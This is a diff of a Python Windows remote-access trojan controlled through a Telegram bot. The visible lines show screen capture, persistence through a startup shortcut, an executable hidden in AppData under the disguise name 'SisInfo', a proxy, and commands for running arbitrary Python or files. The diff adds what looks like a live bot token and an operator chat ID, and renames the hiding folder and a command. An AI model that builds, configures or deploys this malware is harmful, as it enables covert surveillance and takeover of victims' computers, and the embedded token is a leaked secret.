@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 import logging
 from PIL import ImageGrab 								# /capture_pc
-from shutil import copyfile, copyfileobj, rmtree, move 	# /ls, /pwd, /cd, /copy, /mv
+from shutil import copyfile, copyfileobj, rmtree, move 	# /ls, /dir_now, /cd, /copy, /mv
 from sys import argv, path, stdout 						# console output
 from json import loads 									# reading json from ipinfo.io
 from winshell import startup 							# persistence
@@ -31,18 +31,20 @@ import urllib# wallpaper
 
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
-token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'	#ini token bot anda
-#token = os.environ['KENDALI_TOKEN'] 						# you can set your environment variable as well
+#token = 'IIIIIIIII:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
+token = '597821053:AAGRJFURCBnRDm7tQ9TmxvMW_qNa7DLvTEE'
+#token = os.environ['IIIIIIIII:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'] 						# you can set your environment variable as well
 # This will be used for setting paths and related file io -- change to whatever you want
-app_name = 'Portal'
+app_name = 'SisInfo'
 # ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
-known_ids = '' #isi chat_id anda
+known_ids = [597821053]
+#known_ids = [IIIIIIIII]
 #known_ids.append(os.environ['TELEGRAM_CHAT_ID']if 'TELEGRAM_CHAT_ID' in os.environ) 		# make sure to remove this line if you don't have this environment variable
 appdata_roaming_folder = os.environ['APPDATA']			# = 'C:\Users\Username\AppData\Roaming'
 														# HIDING OPTIONS
 														# ---------------------------------------------
-hide_folder = appdata_roaming_folder + '\\' + app_name	# = 'C:\Users\Username\AppData\Roaming\Portal'
-compiled_name = app_name + '.exe'						# Name of compiled .exe to hide in hide_folder, i.e 'C:\Users\Username\AppData\Roaming\Portal\portal.exe'
+hide_folder = appdata_roaming_folder + '\\' + app_name	# = 'C:\Users\Username\AppData\Roaming\SisInfo'
+compiled_name = app_name + '.exe'						# Name of compiled .exe to hide in hide_folder, i.e 'C:\Users\Username\AppData\Roaming\SisInfo\SisInfo.exe'
 														# ---------------------------------------------
 target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
 if not os.path.exists(hide_folder):
@@ -443,7 +445,7 @@ def handle(msg):
                                 info = requests.get('http://ipinfo.io').text #json format
                                 ip = (loads(info)['ip'])
                                 response = 'Proxy succesfully setup on ' + ip + ':8081'
-                        elif command == '/pwd':
+                        elif command == '/dir_now':
                                 response = os.getcwd()
                         elif command.startswith('/python_exec'):
                                 command = command.replace('/python_exec','').strip()
@@ -580,9 +582,9 @@ def handle(msg):
                                                 '/ls':'[target_folder]', \
                                                 '/msg_box':'<text>', \
                                                 '/pc_info':'', \
-                                                '/play':'<youtube_videoId>', \
+                                                '/play':'<youtube_video Id>', \
                                                 '/proxy':'', \
-                                                '/pwd':'', \
+                                                '/dir_now':'', \
                                                 '/python_exec':'<command_chain>', \
                                                 '/reboot':'', \
                                                 '/run':'<target_file>', \
